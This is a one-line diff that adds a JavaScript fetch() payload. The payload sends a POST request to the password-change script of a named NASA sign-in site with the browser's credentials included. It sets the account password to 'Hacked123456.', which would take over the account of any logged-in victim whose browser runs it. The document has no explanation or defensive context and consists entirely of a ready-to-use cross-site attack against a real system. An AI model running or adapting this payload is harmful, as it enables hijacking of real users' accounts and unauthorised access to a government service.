@@ -1,0 +1,1 @@
+fetch('https://cce-signin.gsfc.nasa.gov/cgi-bin/openid_sign_in/change_pw.pl',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'doing_update=1&rpwf=1&wid=10&HDTN=&new_passwd=Hacked123456.&re_new_passwd=Hacked123456.&cpasswd=Change+Password'})
